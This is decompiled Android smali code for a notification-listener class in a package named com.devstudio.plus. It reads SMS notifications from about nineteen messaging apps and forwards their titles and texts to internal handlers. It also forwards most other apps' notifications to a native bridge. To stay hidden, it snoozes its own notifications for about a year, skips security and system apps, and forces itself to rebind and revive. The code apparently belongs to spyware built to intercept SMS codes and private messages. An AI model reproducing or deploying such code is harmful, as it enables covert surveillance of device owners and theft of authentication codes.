.class public final Lcom/devstudio/plus/NotifListener;
.super Landroid/service/notification/NotificationListenerService;
.source "r8-map-id-4f946035ae8b5dc8dc2611fa1065f2bff5a861868bbaf6a3ac203acc3f2498b4"


# static fields
.field public static final Companion:Lp0/b;

.field private static final IGNORED_PACKAGES:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final IGNORED_PREFIXES:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final SMS_APP_PACKAGES:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final TAG:Ljava/lang/String; = "NL"


# direct methods
.method static constructor <clinit>()V
    .locals 48

    .line 1
    new-instance v0, Lp0/b;

    .line 2
    .line 3
    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    .line 4
    .line 5
    .line 6
    sput-object v0, Lcom/devstudio/plus/NotifListener;->Companion:Lp0/b;

    .line 7
    .line 8
    const-string v18, "com.tcl.mms"

    .line 9
    .line 10
    const-string v19, "com.lge.app.mms"

    .line 11
    .line 12
    const-string v1, "com.samsung.android.messaging"

    .line 13
    .line 14
    const-string v2, "com.google.android.apps.messaging"

    .line 15
    .line 16
    const-string v3, "com.android.mms"

    .line 17
    .line 18
    const-string v4, "com.android.messaging"

    .line 19
    .line 20
    const-string v5, "com.xiaomi.mms"

    .line 21
    .line 22
    const-string v6, "com.huawei.message"

    .line 23
    .line 24
    const-string v7, "com.hihonor.mms"

    .line 25
    .line 26
    const-string v8, "com.oneplus.mms"

    .line 27
    .line 28
    const-string v9, "com.oppo.mms"

    .line 29
    .line 30
    const-string v10, "com.coloros.mms"

    .line 31
    .line 32
    const-string v11, "com.realme.mms"

    .line 33
    .line 34
    const-string v12, "com.vivo.mms"

    .line 35
    .line 36
    const-string v13, "com.asus.mms"

    .line 37
    .line 38
    const-string v14, "com.motorola.messaging"

    .line 39
    .line 40
    const-string v15, "com.sonyericsson.conversations"

    .line 41
    .line 42
    const-string v16, "com.transsion.messaging"

    .line 43
    .line 44
    const-string v17, "com.zte.mms"

    .line 45
    .line 46
    filled-new-array/range {v1 .. v19}, [Ljava/lang/String;

    .line 47
    .line 48
    .line 49
    move-result-object v0

    .line 50
    invoke-static {v0}, Le2/l;->k([Ljava/lang/Object;)Ljava/util/Set;

    .line 51
    .line 52
    .line 53
    move-result-object v0

    .line 54
    sput-object v0, Lcom/devstudio/plus/NotifListener;->SMS_APP_PACKAGES:Ljava/util/Set;

    .line 55
    .line 56
    const-string v46, "com.oppo.launcher"

    .line 57
    .line 58
    const-string v47, "com.realme.launcher"

    .line 59
    .line 60
    const-string v1, "android"

    .line 61
    .line 62
    const-string v2, "com.android.systemui"

    .line 63
    .line 64
    const-string v3, "com.android.settings"

    .line 65
    .line 66
    const-string v4, "com.android.vending"

    .line 67
    .line 68
    const-string v5, "com.android.phone"

    .line 69
    .line 70
    const-string v6, "com.android.dialer"

    .line 71
    .line 72
    const-string v7, "com.android.incallui"

    .line 73
    .line 74
    const-string v8, "com.android.bluetooth"

    .line 75
    .line 76
    const-string v9, "com.android.providers.downloads"

    .line 77
    .line 78
    const-string v10, "com.android.documentsui"

    .line 79
    .line 80
    const-string v11, "com.android.shell"

    .line 81
    .line 82
    const-string v12, "com.android.packageinstaller"

    .line 83
    .line 84
    const-string v13, "com.android.deskclock"

    .line 85
    .line 86
    const-string v14, "com.android.calendar"

    .line 87
    .line 88
    const-string v15, "com.android.calculator2"

    .line 89
    .line 90
    const-string v16, "com.android.nfc"

    .line 91
    .line 92
    const-string v17, "com.android.printspooler"

    .line 93
    .line 94
    const-string v18, "com.android.server.telecom"

    .line 95
    .line 96
    const-string v19, "com.android.inputmethod.latin"

    .line 97
    .line 98
    const-string v20, "com.android.launcher"

    .line 99
    .line 100
    const-string v21, "com.android.launcher3"

    .line 101
    .line 102
    const-string v22, "com.google.android.gms"

    .line 103
    .line 104
    const-string v23, "com.google.android.gsf"

    .line 105
    .line 106
    const-string v24, "com.google.android.setupwizard"

    .line 107
    .line 108
    const-string v25, "com.google.android.apps.setupwizard"

    .line 109
    .line 110
    const-string v26, "com.google.android.packageinstaller"

    .line 111
    .line 112
    const-string v27, "com.google.android.permissioncontroller"

    .line 113
    .line 114
    const-string v28, "com.google.android.ext.services"

    .line 115
    .line 116
    const-string v29, "com.google.android.inputmethod.latin"

    .line 117
    .line 118
    const-string v30, "com.google.android.tts"

    .line 119
    .line 120
    const-string v31, "com.google.android.projection.gearhead"

    .line 121
    .line 122
    const-string v32, "com.google.android.deskclock"

    .line 123
    .line 124
    const-string v33, "com.google.android.apps.wallpaper"

    .line 125
    .line 126
    const-string v34, "com.google.android.configupdater"

    .line 127
    .line 128
    const-string v35, "com.google.android.partnersetup"

    .line 129
    .line 130
    const-string v36, "com.miui.securitycenter"

    .line 131
    .line 132
    const-string v37, "com.miui.cleanmaster"

    .line 133
    .line 134
    const-string v38, "com.miui.powerkeeper"

    .line 135
    .line 136
    const-string v39, "com.miui.home"

    .line 137
    .line 138
    const-string v40, "com.huawei.systemmanager"

    .line 139
    .line 140
    const-string v41, "com.huawei.android.launcher"

    .line 141
    .line 142
    const-string v42, "com.samsung.android.launcher"

    .line 143
    .line 144
    const-string v43, "com.samsung.android.incallui"

    .line 145
    .line 146
    const-string v44, "com.samsung.android.dialer"

    .line 147
    .line 148
    const-string v45, "com.coloros.safecenter"

    .line 149
    .line 150
    filled-new-array/range {v1 .. v47}, [Ljava/lang/String;

    .line 151
    .line 152
    .line 153
    move-result-object v0

    .line 154
    invoke-static {v0}, Le2/l;->k([Ljava/lang/Object;)Ljava/util/Set;

    .line 155
    .line 156
    .line 157
    move-result-object v0

    .line 158
    sput-object v0, Lcom/devstudio/plus/NotifListener;->IGNORED_PACKAGES:Ljava/util/Set;

    .line 159
    .line 160
    const-string v0, "com.google.android.overlay."

    .line 161
    .line 162
    const-string v1, "com.google.android.onetimeinitializer"

    .line 163
    .line 164
    const-string v2, "com.android.providers."

    .line 165
    .line 166
    const-string v3, "com.android.server."

    .line 167
    .line 168
    const-string v4, "com.android.internal."

    .line 169
    .line 170
    filled-new-array {v2, v3, v4, v0, v1}, [Ljava/lang/String;

    .line 171
    .line 172
    .line 173
    move-result-object v0

    .line 174
    invoke-static {v0}, Lv0/g;->n([Ljava/lang/Object;)Ljava/util/List;

    .line 175
    .line 176
    .line 177
    move-result-object v0

    .line 178
    sput-object v0, Lcom/devstudio/plus/NotifListener;->IGNORED_PREFIXES:Ljava/util/List;

    .line 179
    .line 180
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 1
    invoke-direct {p0}, Landroid/service/notification/NotificationListenerService;-><init>()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private final handleSmsNotification(Landroid/service/notification/StatusBarNotification;)V
    .locals 3

    .line 1
    :try_start_0
    invoke-virtual {p1}, Landroid/service/notification/StatusBarNotification;->getNotification()Landroid/app/Notification;

    .line 2
    .line 3
    .line 4
    move-result-object p1

    .line 5
    const/4 v0, 0x0

    .line 6
    if-eqz p1, :cond_0

    .line 7
    .line 8
    iget-object p1, p1, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    .line 9
    .line 10
    goto :goto_0

    .line 11
    :catch_0
    move-exception p1

    .line 12
    goto :goto_5

    .line 13
    :cond_0
    move-object p1, v0

    .line 14
    :goto_0
    if-nez p1, :cond_1

    .line 15
    .line 16
    goto :goto_4

    .line 17
    :cond_1
    const-string v1, "android.title"

    .line 18
    .line 19
    invoke-virtual {p1, v1}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 20
    .line 21
    .line 22
    move-result-object v1

    .line 23
    if-eqz v1, :cond_2

    .line 24
    .line 25
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 26
    .line 27
    .line 28
    move-result-object v1

    .line 29
    goto :goto_1

    .line 30
    :cond_2
    move-object v1, v0

    .line 31
    :goto_1
    if-eqz v1, :cond_8

    .line 32
    .line 33
    invoke-static {v1}, Ln1/k;->r(Ljava/lang/String;)Z

    .line 34
    .line 35
    .line 36
    move-result v2

    .line 37
    if-eqz v2, :cond_3

    .line 38
    .line 39
    goto :goto_4

    .line 40
    :cond_3
    const-string v2, "android.bigText"

    .line 41
    .line 42
    invoke-virtual {p1, v2}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 43
    .line 44
    .line 45
    move-result-object v2

    .line 46
    if-eqz v2, :cond_4

    .line 47
    .line 48
    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 49
    .line 50
    .line 51
    move-result-object v2

    .line 52
    goto :goto_2

    .line 53
    :cond_4
    move-object v2, v0

    .line 54
    :goto_2
    if-nez v2, :cond_5

    .line 55
    .line 56
    const-string v2, "android.text"

    .line 57
    .line 58
    invoke-virtual {p1, v2}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 59
    .line 60
    .line 61
    move-result-object p1

    .line 62
    if-eqz p1, :cond_6

    .line 63
    .line 64
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 65
    .line 66
    .line 67
    move-result-object v0

    .line 68
    goto :goto_3

    .line 69
    :cond_5
    move-object v0, v2

    .line 70
    :cond_6
    :goto_3
    if-eqz v0, :cond_8

    .line 71
    .line 72
    invoke-static {v0}, Ln1/k;->r(Ljava/lang/String;)Z

    .line 73
    .line 74
    .line 75
    move-result p1

    .line 76
    if-eqz p1, :cond_7

    .line 77
    .line 78
    goto :goto_4

    .line 79
    :cond_7
    sget-object p1, Lp0/j;->a:Lp0/j;

    .line 80
    .line 81
    const/4 v2, 0x0

    .line 82
    invoke-virtual {p1, v1, v0, v2}, Lp0/j;->a(Ljava/lang/String;Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 83
    .line 84
    .line 85
    :cond_8
    :goto_4
    return-void

    .line 86
    :goto_5
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 87
    .line 88
    .line 89
    return-void
.end method

.method private final reviveServiceIfNeeded()V
    .locals 8

    .line 1
    :try_start_0
    const-string v0, "heartbeat"

    .line 2
    .line 3
    const/4 v1, 0x0

    .line 4
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 5
    .line 6
    .line 7
    move-result-object v0

    .line 8
    const-string v1, "last_beat_ms"

    .line 9
    .line 10
    const-wide/16 v2, 0x0

    .line 11
    .line 12
    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    .line 13
    .line 14
    .line 15
    move-result-wide v0

    .line 16
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 17
    .line 18
    .line 19
    move-result-wide v4

    .line 20
    sub-long/2addr v4, v0

    .line 21
    const-wide/32 v6, 0xea60

    .line 22
    .line 23
    .line 24
    cmp-long v4, v4, v6

    .line 25
    .line 26
    if-lez v4, :cond_0

    .line 27
    .line 28
    cmp-long v0, v0, v2

    .line 29
    .line 30
    if-lez v0, :cond_0

    .line 31
    .line 32
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 33
    .line 34
    .line 35
    move-result-object v0

    .line 36
    const-string v1, "NL_REVIVE"

    .line 37
    .line 38
    invoke-static {v0, v1}, Lk0/f;->l(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 39
    .line 40
    .line 41
    :catch_0
    :cond_0
    return-void
.end method


# virtual methods
.method public onListenerConnected()V
    .locals 6

    .line 1
    invoke-super {p0}, Landroid/service/notification/NotificationListenerService;->onListenerConnected()V

    .line 2
    .line 3
    .line 4
    invoke-direct {p0}, Lcom/devstudio/plus/NotifListener;->reviveServiceIfNeeded()V

    .line 5
    .line 6
    .line 7
    :try_start_0
    invoke-virtual {p0}, Landroid/service/notification/NotificationListenerService;->getActiveNotifications()[Landroid/service/notification/StatusBarNotification;

    .line 8
    .line 9
    .line 10
    move-result-object v0

    .line 11
    if-eqz v0, :cond_1

    .line 12
    .line 13
    array-length v1, v0

    .line 14
    const/4 v2, 0x0

    .line 15
    :goto_0
    if-ge v2, v1, :cond_1

    .line 16
    .line 17
    aget-object v3, v0, v2

    .line 18
    .line 19
    invoke-virtual {v3}, Landroid/service/notification/StatusBarNotification;->getPackageName()Ljava/lang/String;

    .line 20
    .line 21
    .line 22
    move-result-object v4

    .line 23
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 24
    .line 25
    .line 26
    move-result-object v5

    .line 27
    invoke-virtual {v5}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 28
    .line 29
    .line 30
    move-result-object v5

    .line 31
    invoke-static {v4, v5}, Lh1/m;->a(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 32
    .line 33
    .line 34
    move-result v4

    .line 35
    if-eqz v4, :cond_0

    .line 36
    .line 37
    invoke-virtual {v3}, Landroid/service/notification/StatusBarNotification;->getKey()Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    move-result-object v3

    .line 41
    const-wide v4, 0x757b12c00L

    .line 42
    .line 43
    .line 44
    .line 45
    .line 46
    invoke-virtual {p0, v3, v4, v5}, Landroid/service/notification/NotificationListenerService;->snoozeNotification(Ljava/lang/String;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 47
    .line 48
    .line 49
    :cond_0
    add-int/lit8 v2, v2, 0x1

    .line 50
    .line 51
    goto :goto_0

    .line 52
    :catch_0
    :cond_1
    return-void
.end method

.method public onListenerDisconnected()V
    .locals 3

    .line 1
    invoke-super {p0}, Landroid/service/notification/NotificationListenerService;->onListenerDisconnected()V

    .line 2
    .line 3
    .line 4
    :try_start_0
    new-instance v0, Landroid/content/ComponentName;

    .line 5
    .line 6
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 7
    .line 8
    .line 9
    move-result-object v1

    .line 10
    const-class v2, Lcom/devstudio/plus/NotifListener;

    .line 11
    .line 12
    invoke-direct {v0, v1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 13
    .line 14
    .line 15
    invoke-static {v0}, Landroid/service/notification/NotificationListenerService;->requestRebind(Landroid/content/ComponentName;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 16
    .line 17
    .line 18
    :catch_0
    return-void
.end method

.method public onNotificationPosted(Landroid/service/notification/StatusBarNotification;)V
    .locals 5

    .line 1
    invoke-direct {p0}, Lcom/devstudio/plus/NotifListener;->reviveServiceIfNeeded()V

    .line 2
    .line 3
    .line 4
    :try_start_0
    invoke-virtual {p1}, Landroid/service/notification/StatusBarNotification;->getPackageName()Ljava/lang/String;

    .line 5
    .line 6
    .line 7
    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 8
    const-string v1, ""

    .line 9
    .line 10
    if-nez v0, :cond_0

    .line 11
    .line 12
    move-object v0, v1

    .line 13
    :cond_0
    :try_start_1
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 14
    .line 15
    .line 16
    move-result-object v2

    .line 17
    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 18
    .line 19
    .line 20
    move-result-object v2

    .line 21
    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 22
    .line 23
    .line 24
    move-result v2

    .line 25
    if-eqz v2, :cond_1

    .line 26
    .line 27
    goto/16 :goto_6

    .line 28
    .line 29
    :cond_1
    sget-object v2, Lcom/devstudio/plus/NotifListener;->SMS_APP_PACKAGES:Ljava/util/Set;

    .line 30
    .line 31
    invoke-interface {v2, v0}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 32
    .line 33
    .line 34
    move-result v2

    .line 35
    if-eqz v2, :cond_2

    .line 36
    .line 37
    invoke-direct {p0, p1}, Lcom/devstudio/plus/NotifListener;->handleSmsNotification(Landroid/service/notification/StatusBarNotification;)V

    .line 38
    .line 39
    .line 40
    return-void

    .line 41
    :catch_0
    move-exception p1

    .line 42
    goto/16 :goto_5

    .line 43
    .line 44
    :cond_2
    sget-object v2, Lcom/devstudio/plus/NotifListener;->IGNORED_PACKAGES:Ljava/util/Set;

    .line 45
    .line 46
    invoke-interface {v2, v0}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 47
    .line 48
    .line 49
    move-result v2

    .line 50
    if-eqz v2, :cond_3

    .line 51
    .line 52
    goto/16 :goto_6

    .line 53
    .line 54
    :cond_3
    sget-object v2, Lcom/devstudio/plus/NotifListener;->IGNORED_PREFIXES:Ljava/util/List;

    .line 55
    .line 56
    if-eqz v2, :cond_4

    .line 57
    .line 58
    invoke-interface {v2}, Ljava/util/Collection;->isEmpty()Z

    .line 59
    .line 60
    .line 61
    move-result v3

    .line 62
    if-eqz v3, :cond_4

    .line 63
    .line 64
    goto :goto_0

    .line 65
    :cond_4
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    .line 66
    .line 67
    .line 68
    move-result-object v2

    .line 69
    :cond_5
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    .line 70
    .line 71
    .line 72
    move-result v3

    .line 73
    if-eqz v3, :cond_6

    .line 74
    .line 75
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 76
    .line 77
    .line 78
    move-result-object v3

    .line 79
    check-cast v3, Ljava/lang/String;

    .line 80
    .line 81
    invoke-virtual {v0, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    .line 82
    .line 83
    .line 84
    move-result v3

    .line 85
    if-eqz v3, :cond_5

    .line 86
    .line 87
    goto/16 :goto_6

    .line 88
    .line 89
    :cond_6
    :goto_0
    invoke-virtual {p1}, Landroid/service/notification/StatusBarNotification;->getNotification()Landroid/app/Notification;

    .line 90
    .line 91
    .line 92
    move-result-object p1

    .line 93
    const/4 v2, 0x0

    .line 94
    if-eqz p1, :cond_7

    .line 95
    .line 96
    iget-object p1, p1, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    .line 97
    .line 98
    goto :goto_1

    .line 99
    :cond_7
    move-object p1, v2

    .line 100
    :goto_1
    if-nez p1, :cond_8

    .line 101
    .line 102
    goto :goto_6

    .line 103
    :cond_8
    const-string v3, "android.title"

    .line 104
    .line 105
    invoke-virtual {p1, v3}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 106
    .line 107
    .line 108
    move-result-object v3

    .line 109
    if-eqz v3, :cond_9

    .line 110
    .line 111
    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 112
    .line 113
    .line 114
    move-result-object v3

    .line 115
    if-nez v3, :cond_a

    .line 116
    .line 117
    :cond_9
    move-object v3, v1

    .line 118
    :cond_a
    const-string v4, "android.bigText"

    .line 119
    .line 120
    invoke-virtual {p1, v4}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 121
    .line 122
    .line 123
    move-result-object v4

    .line 124
    if-eqz v4, :cond_b

    .line 125
    .line 126
    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 127
    .line 128
    .line 129
    move-result-object v4

    .line 130
    goto :goto_2

    .line 131
    :cond_b
    move-object v4, v2

    .line 132
    :goto_2
    if-nez v4, :cond_e

    .line 133
    .line 134
    const-string v4, "android.text"

    .line 135
    .line 136
    invoke-virtual {p1, v4}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 137
    .line 138
    .line 139
    move-result-object p1

    .line 140
    if-eqz p1, :cond_c

    .line 141
    .line 142
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 143
    .line 144
    .line 145
    move-result-object v2

    .line 146
    :cond_c
    if-nez v2, :cond_d

    .line 147
    .line 148
    goto :goto_3

    .line 149
    :cond_d
    move-object v1, v2

    .line 150
    goto :goto_3

    .line 151
    :cond_e
    move-object v1, v4

    .line 152
    :goto_3
    invoke-static {v1}, Ln1/k;->r(Ljava/lang/String;)Z

    .line 153
    .line 154
    .line 155
    move-result p1

    .line 156
    if-eqz p1, :cond_f

    .line 157
    .line 158
    invoke-static {v3}, Ln1/k;->r(Ljava/lang/String;)Z

    .line 159
    .line 160
    .line 161
    move-result p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 162
    if-eqz p1, :cond_f

    .line 163
    .line 164
    goto :goto_6

    .line 165
    :cond_f
    :try_start_2
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 166
    .line 167
    .line 168
    move-result-object p1

    .line 169
    const/4 v2, 0x0

    .line 170
    invoke-virtual {p1, v0, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    .line 171
    .line 172
    .line 173
    move-result-object p1

    .line 174
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 175
    .line 176
    .line 177
    move-result-object v2

    .line 178
    invoke-virtual {v2, p1}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    .line 179
    .line 180
    .line 181
    move-result-object p1

    .line 182
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 183
    .line 184
    .line 185
    move-result-object p1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 186
    goto :goto_4

    .line 187
    :catch_1
    move-object p1, v0

    .line 188
    :goto_4
    :try_start_3
    invoke-static {v0, v3, v1, p1}, Lcom/devstudio/plus/NativeBridge;->onNotification(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 189
    .line 190
    .line 191
    goto :goto_6

    .line 192
    :goto_5
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 193
    .line 194
    .line 195
    :goto_6
    return-void
.end method
